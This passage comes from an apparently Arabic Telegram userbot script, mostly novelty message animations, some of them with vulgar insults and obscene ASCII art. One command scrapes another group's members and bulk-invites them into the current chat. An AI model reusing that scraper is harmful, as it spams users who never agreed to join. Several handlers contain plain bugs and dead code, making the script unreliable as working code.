𝟏 𝟐 𝟑 𝟒 𝟓 𝟔 𝟕 𝟖 𝟗 𝟎
𝟭 𝟮 𝟯 𝟰 𝟱 𝟲 𝟳 𝟴 𝟵 𝟬
①②③④⑤⑥⑦⑧⑨⓪
❶❷❸❹❺❻❼❽❾⓿
⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴"""
)

@client.on(events.NewMessage(outgoing=True, pattern=".حلويات"))
async def _(event):
    event = await event.edit("candy")
    deq = deque(list("🍦🍧🍩🍪🎂🍰🧁🍫🍬🍭"))
    for _ in range(100):
        await asyncio.sleep(0.4)
        await event.edit("".join(deq))
        deq.rotate(1)

@client.on(events.NewMessage(outgoing=True, pattern=".ورده"))
async def nih(e):
        await e.edit("`\n(\_/)`"
                     "`\n(•_•)`"
                     "`\n >🌹 *`"
                     "`\n                    `"
                     "`\n(\_/)`"
                     "`\n(•_•)`"
                     "`\n🌹<\ *`")

@client.on(events.NewMessage(outgoing=True, pattern=".فشر"))
async def _(event):
    if event.fwd_from:
        return
    animation_interval = 0.5
    animation_ttl = range(0, 6)
    await event.edit("nakal")
    animation_chars = [
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀   ⢳⡀⠀⡏⠀⠀⠀   ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀  ⠀   ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀  ⣿  ⢹⠀        ⡇\n  ⠙⢿⣯⠄⠀⠀⠀__⠀⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀  ⠀⢳⡀⠀⡏⠀⠀⠀   ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀      ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀  ⣿  ⢹⠀        ⡇\n  ⠙⢿⣯⠄⠀⠀|__|⠀⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀     ⠀⢳⡀⠀⡏⠀⠀    ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀     ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀  ⣿  ⢹⠀         ⡇\n  ⠙⢿⣯⠄⠀⠀كسمك⠀⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀     ⠀⢳⡀⠀⡏⠀⠀    ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀   ⠀     ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك  ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀   ⣿  ⢹⠀        ⡇\n  ⠙⢿⣯⠄⠀⠀⠀__ ⠀⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀   ⢳⡀⠀⡏⠀⠀    ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀ ⠀     ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀  ⣿  ⢹⠀        ⡇\n  ⠙⢿⣯⠄⠀⠀|__| ⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",    
            "`⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n ⠀⣴⠿⠏⠀⠀⠀⠀⠀  ⠀⢳⡀⠀⡏⠀⠀    ⠀⢷\n⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀  ⠀     ⡇\n⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿  ⣸ كسمك   ⡇\n ⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀   ⣿  ⢹⠀        ⡇\n  ⠙⢿⣯⠄⠀⠀كسمك⠀⠀⡿ ⠀⡇⠀⠀⠀⠀    ⡼\n⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀   ⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀ ⠀⣄⢸⠀⠀⠀⠀⠀⠀`",
        ]
    for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 6])	
		

@client.on(events.NewMessage(outgoing=True, pattern=".فراشه"))
async def _(event):
	if event.fwd_from:
		return
	deq = deque(list("🦋✨🦋✨🦋✨🦋✨"))
	for _ in range(48):
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)
		
@client.on(events.NewMessage(outgoing=True, pattern=".اكتب (.*)"))
async def _(event):
    if event.fwd_from:
        return
    # https://t.me/AnotherGroup/176551
    input_str = event.pattern_match.group(1)
    shiiinabot = "\u2060"
    for i in range(601):
        shiiinabot += "\u2060"
    try:
        await event.edit(shiiinabot)
    except Exception as e:
        logger.warn(str(e))
    typing_symbol = ".✨."
    DELAY_BETWEEN_EDITS = 0.3
    previous_text = ""
    await event.edit(typing_symbol)
    await asyncio.sleep(DELAY_BETWEEN_EDITS)
    for character in input_str:
        previous_text = previous_text + "" + character
        typing_text = previous_text + "" + typing_symbol
        try:
            await event.edit(typing_text)
        except Exception as e:
            logger.warn(str(e))
            pass
        await asyncio.sleep(DELAY_BETWEEN_EDITS)
        try:
            await event.edit(previous_text)
        except Exception as e:
            logger.warn(str(e))
            pass
        await asyncio.sleep(DELAY_BETWEEN_EDITS)


@client.on(events.NewMessage(outgoing=True, pattern=".قطار"))
async def _(event):
    if event.fwd_from:
        return
    animation_interval = 0.2
    animation_ttl = range(0, 30)
    await event.edit("repe")
    animation_chars = [
        
            "**9**",
            "**8**",
            "**7**",
            "**6**",
            "**5**",    
            "**4**",
            "**3**",
            "**2**",
            "**1**",
            "**اجه القطار**",
            "**🚅🚃🚃**",
            "**🚅🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃**",
            "**🚅🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃**",
            "🚅🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃🚃",
            "🚃🚃🚃🚃🚃",
            "🚃🚃🚃",
            "🚃🚃",
            "🚃",
            "**راح القطار**"
 ]
    for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 30])	


@client.on(events.NewMessage(outgoing=True, pattern=".موسيقى"))
async def _(event):
    if event.fwd_from:
        return
    animation_interval = 1.5
    animation_ttl = range(0, 11)
    await event.edit("starting player...")
    animation_chars = [
            "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:00** ▱▱▱▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `▶️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:01** ▰▱▱▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay  Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:02** ▰▰▱▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤⬤ 81% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:03** ▰▰▰▱▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:04** ▰▰▰▰▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:05** ▰▰▰▰▱▱▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",    
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:06** ▰▰▰▰▰▰▱▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:07** ▰▰▰▰▰▰▰▱▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:08** ▰▰▰▰▰▰▰▰▱▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:09** ▰▰▰▰▰▰▰▰▰▱ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏸️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**",
            "⬤⬤◯ 80% ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`✖️`\n\n⠀⠀⠀⠀⠀[cee jay Music Player](tg://user?id=916234223)\n\n⠀⠀⠀⠀**Now Playing:shape of u**\n\n**00:10** ▰▰▰▰▰▰▰▰▰▰ **00:10**\n\n⠀⠀⠀⠀⠀`🔂` `⏮️` `⏪️` `⏺️` `⏩️` `⏭️`\n\n**⠀Next Song:** __Alan Walker - Alone.__\n\n⠀⠀⠀⠀**⠀Device: Nokia 1100**"
        ]
    for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 11])		


@client.on(events.NewMessage(outgoing=True, pattern=".فاك"))  
async def gtfo(e):
        await e.edit(
"\n......................................../´¯/) "
"\n......................................,/¯../ "
"\n...................................../..../ "
"\n..................................../´.¯/"
"\n..................................../´¯/"
"\n..................................,/¯../ "
"\n................................../..../ "
"\n................................./´¯./"
"\n................................/´¯./"
"\n..............................,/¯../ "
"\n............................./..../ "
"\n............................/´¯/"
"\n........................../´¯./"
"\n........................,/¯../ "
"\n......................./..../ "
"\n....................../´¯/"
"\n....................,/¯../ "
"\n.................../..../ "
"\n............./´¯/'...'/´¯¯`·¸ "
"\n........../'/.../..../......./¨¯\ "
"\n........('(...´...´.... ¯~/'...') "
"\n.........\.................'...../ "
"\n..........''...\.......... _.·´ "
"\n............\..............( "
"\n..............\.............\...")
 
@client.on(events.NewMessage(outgoing=True, pattern=".محادثات"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.now()
    u = 0 # number of users
    g = 0 # number of basic groups
    c = 0 # number of super groups
    bc = 0 # number of channels
    b = 0 # number of bots
    await event.edit(" انتضر يتم جلب عدد المحادثات ")
    async for d in client.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            logger.info(d.stringify())
    end = datetime.now()
    ms = (end - start).seconds
    await event.edit("""Obtained in {} seconds.
Users:\t{}
Groups:\t{}
Super Groups:\t{}
Channels:\t{}
Bots:\t{}""".format(ms, u, g, c, bc, b))

@client.on(events.NewMessage(outgoing=True, pattern=".طيارة"))
async def _(event):
    if event.fwd_from:
        retun
    await event.edit("✈-------------")
    await event.edit("-✈------------")
    await event.edit("--✈-----------")
    await event.edit("---✈----------")
    await event.edit("----✈---------")
    await event.edit("-----✈--------")
    await event.edit("------✈-------")
    await event.edit("-------✈------")
    await event.edit("--------✈-----") 
    await event.edit("---------✈----")
    await event.edit("----------✈---")
    await event.edit("-----------✈--")
    await event.edit("------------✈-")
    await event.edit("-------------✈")
    await asyncio.sleep(3.5)
    await event.delete()           

@client.on(events.NewMessage(outgoing=True, pattern=".دوران"))
async def _(event):
    if event.fwd_from:
        return
    animation_interval = 0.1
    animation_ttl = range(0, 80)
    await event.edit("solarsystem")
    animation_chars = [
            "`◼️◼️◼️◼️◼️\n◼️◼️◼️◼️☀\n◼️◼️🌎◼️◼️\n🌕◼️◼️◼️◼️\n◼️◼️◼️◼️◼️`",
            "`◼️◼️◼️◼️◼️\n🌕◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️☀\n◼️◼️◼️◼️◼️`",
            "`◼️🌕◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️☀◼️`",
            "`◼️◼️◼️🌕◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️☀◼️◼️◼️`",
            "`◼️◼️◼️◼️◼️\n◼️◼️◼️◼️🌕\n◼️◼️🌎◼️◼️\n☀◼️◼️◼️◼️\n◼️◼️◼️◼️◼️`",    
            "`◼️◼️◼️◼️◼️\n☀◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️🌕\n◼️◼️◼️◼️◼️`",
            "`◼️☀◼️◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️◼️◼️🌕◼️`",
            "`◼️◼️◼️☀◼️\n◼️◼️◼️◼️◼️\n◼️◼️🌎◼️◼️\n◼️◼️◼️◼️◼️\n◼️🌕◼️◼️◼️`",
            ]
    for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 8])      


@client.on(events.NewMessage(outgoing=True, pattern=".ضحك")) 
async def _(event):
	if event.fwd_from:
		return
	deq = deque(list("😂🤣😂🤣😂🤣"))
	for _ in range(48):
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)  
		          
@client.on(events.NewMessage(outgoing=True, pattern=".قمر"))
async def _(event):
    event = await event.edit("قمر")
    deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
    for _ in range(48):
        await asyncio.sleep(0.2)
        await event.edit("".join(deq))
        deq.rotate(1)
        
@client.on(events.NewMessage(outgoing=True, pattern=".قمور"))
async def _(event):
    event = await event.edit("قمور")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("قمور..")
    animation_chars = [
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
        "🌗",
        "🌘",
        "🌑",
        "🌒",
        "🌓",
        "🌔",
        "🌕",
        "🌖",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 32])

loop = asyncio.get_event_loop()

async def unblock_users(client):
    @client.on(events.NewMessage(outgoing=True, pattern='.فك المحظورين'))
    async def _(event):
        list = await client(GetBlockedRequest(offset=0, limit=1000000))
        if len(list.blocked) == 0 :
            razan = await event.edit(f'- لم تقم بحظر اي شخص اصلا .')
        else :
            unblocked_count = 1
            for user in list.blocked :
                UnBlock = await client(UnblockRequest(id=int(user.peer_id.user_id)))
                unblocked_count += 1
                razan = await event.edit(f'- جار الغاء حظر  {round((unblocked_count * 100) / len(list.blocked), 2)}%')
            unblocked_count = 1
            razan = await event.edit(f'- تم الغاء حظر : {len(list.blocked)}\n\n- تم المستخدمين المحظورين في الخاص بنجاح  .')

@client.on(events.NewMessage(outgoing=True, pattern=".ضيف"))
async def get_users(event):
    legen_ = event.text[10:]
    client_chat = legen_.lower
    restricted = ["@super_client", "@client_support"]
    client = await event.edit(f"**جارِ اضأفه الاعضاء من  ** {legen_}")
    if client_chat in restricted:
        return await client.edit(
            event, "**- لا يمكنك اخذ الاعضاء من مجموعه السورس العب بعيد ابني  :)**"
        )
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        await client.edit("**▾∮ تتم العملية انتظر قليلا ...**")
    else:
        await client.edit("**▾∮ تتم العملية انتظر قليلا ...**")
    if event.is_private:
        return await client.edit("- لا يمكنك اضافه الاعضاء هنا")
    s = 0
    f = 0
    error = "None"
    await client.edit(
        "**▾∮ حالة الأضافة:**\n\n**▾∮ تتم جمع معلومات المستخدمين 🔄 ...⏣**"
    )
    async for user in event.client.iter_participants(event.pattern_match.group(1)):
        try:
            if error.startswith("Too"):
                return await client.edit(
                    f"**حالة الأضافة انتهت مع الأخطاء**\n- (**ربما هنالك ضغط على الأمر حاول مجددا لاحقا **) \n**الخطأ** : \n`{error}`\n\n• اضافة `{s}` \n• خطأ بأضافة `{f}`"
                )
            tol = f"@{user.username}"
            lol = tol.split("`")
            await client(InviteToChannelRequest(channel=event.chat_id, users=lol))
            s = s + 1
            await client.edit(
                f"**▾∮تتم الأضافة **\n\n• اضيف `{s}` \n•  خطأ بأضافة `{f}` \n\n**× اخر خطأ:** `{error}`"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await client.edit(
        f"**▾∮اڪتملت الأضافة ✅** \n\n• تم بنجاح اضافة `{s}` \n• خطأ بأضافة `{f}`"
    )
    

    while True:
        await send_prayer()
        await asyncio.sleep(random.choices(list(phrase_frequencies.values()))[0])




print("""
   .

                    
---------------------
𝗔𝗟𝗣𝗛𝗔  = تم تشغيل السورس
---------------------

.
    """)
    

loop.create_task(unblock_users(client))
client.run_until_disconnected()
